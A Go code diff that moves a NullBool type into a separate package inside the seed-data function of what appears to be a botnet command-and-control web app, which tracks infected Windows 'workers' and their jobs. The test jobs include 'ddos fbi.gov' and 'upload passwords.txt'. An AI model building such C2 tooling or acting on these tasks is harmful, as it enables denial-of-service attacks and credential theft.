@@ -1,6 +1,7 @@
 package models
 
 import (
+	"WebAppGo/api/types"
 	"database/sql"
 	_ "github.com/go-sql-driver/mysql"
 	"time"
@@ -39,8 +40,8 @@ func AddTestData() {
 		Os:       "Windows 10",
 		Country:  "Germany",
 		IpAddr:   "234.145.222.1",
-		IsAdmin:  NullBool{Bool: true, Valid: true},
-		Boost:    NullBool{Bool: true, Valid: true},
+		IsAdmin:  types.NullBool{Bool: true, Valid: true},
+		Boost:    types.NullBool{Bool: true, Valid: true},
 		LastSeen: time.Now(),
 	}
 	w2 := Worker{
@@ -49,8 +50,8 @@ func AddTestData() {
 		Os:       "Windows 7",
 		Country:  "England",
 		IpAddr:   "127.2.4.1",
-		IsAdmin:  NullBool{Bool: false, Valid: true},
-		Boost:    NullBool{Bool: false, Valid: true},
+		IsAdmin:  types.NullBool{Bool: false, Valid: true},
+		Boost:    types.NullBool{Bool: false, Valid: true},
 		LastSeen: time.Now(),
 	}
 	w3 := Worker{
@@ -59,8 +60,8 @@ func AddTestData() {
 		Os:       "Windows 8",
 		Country:  "USA",
 		IpAddr:   "127.11.55.1",
-		IsAdmin:  NullBool{Bool: true, Valid: true},
-		Boost:    NullBool{Bool: false, Valid: true},
+		IsAdmin:  types.NullBool{Bool: true, Valid: true},
+		Boost:    types.NullBool{Bool: false, Valid: true},
 		LastSeen: time.Now(),
 	}
 	w4 := Worker{
@@ -69,8 +70,8 @@ func AddTestData() {
 		Os:       "Windows 10",
 		Country:  "Russia",
 		IpAddr:   "127.66.33.1",
-		IsAdmin:  NullBool{Bool: false, Valid: true},
-		Boost:    NullBool{Bool: false, Valid: true},
+		IsAdmin:  types.NullBool{Bool: false, Valid: true},
+		Boost:    types.NullBool{Bool: false, Valid: true},
 		LastSeen: time.Now(),
 	}
 	const insertQuery1 = "INSERT INTO workers(id,hostname,country,ip_addr,os,is_admin,boost,last_seen) VALUES(?,?,?,?,?,?,?,?)"
@@ -111,13 +112,13 @@ func AddTestData() {
 
 	j1 := Job{
 		Todo:     "ddos fbi.gov",
-		IsDone:   NullBool{Bool: false, Valid: true},
+		IsDone:   types.NullBool{Bool: false, Valid: true},
 		Created:  time.Now(),
 		WorkerId: w1.Id,
 	}
 	j2 := Job{
 		Todo:     "upload passwords.txt",
-		IsDone:   NullBool{Bool: true, Valid: true},
+		IsDone:   types.NullBool{Bool: true, Valid: true},
 		Created:  time.Now(),
 		WorkerId: w1.Id,
 	}
